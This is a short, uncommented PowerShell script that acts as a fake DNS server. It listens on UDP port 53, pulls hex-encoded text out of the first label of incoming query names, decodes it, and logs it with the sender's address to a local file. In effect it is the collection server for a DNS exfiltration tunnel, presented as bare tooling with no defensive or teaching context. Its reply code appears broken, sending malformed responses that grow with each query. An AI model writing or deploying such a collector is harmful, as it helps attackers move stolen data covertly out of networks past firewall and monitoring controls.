param( $address="Any", $port=53, $basepath="d:\recive.txt" )

try{
	$endpoint = new-object System.Net.IPEndPoint( [IPAddress]::$address, $port )
	$udpclient = new-object System.Net.Sockets.UdpClient $port
}
catch{
	throw $_
	exit -1
}

if (!(Get-ChildItem -Path $basepath -ErrorAction SilentlyContinue)){
    $File = New-Item -Path $basepath -ItemType file
}else{
    $File = Get-ChildItem -Path $basepath
}
while( $true ){
	if($udpclient.Available){
		$content = $udpclient.Receive( [ref]$endpoint )
        $fid="$($endpoint.Address.IPAddressToString)    $((Get-Date).DateTime)"
        $qlen=$content[12]
        $qry=""
        for ($i=0; $i -lt $qlen; $i++){
            $charx=([char][byte]($content[13+$i]))
            if (($i -le 40) -and ($charx -imatch "[a-f0-9]")){
                $qry=$qry+$charx
            }
        }     
        $txtbuf=(-join ($qry -split '(..)' | ? { $_ } | % { [char][convert]::ToUInt32($_,16) }))
        Add-Content -Path ($File.FullName) -Value "$fid    $txtbuf" 
        Write-Host "!" -NoNewline
        $fid = ""
        $txtbuf = ""
        $dgram+=(0,0,0x29,0x0f,0xa0,0,0,0,0,0,0) #OPT
        $udpclient.Send($dgram, $dgram.Length, $endpoint)
	}
}
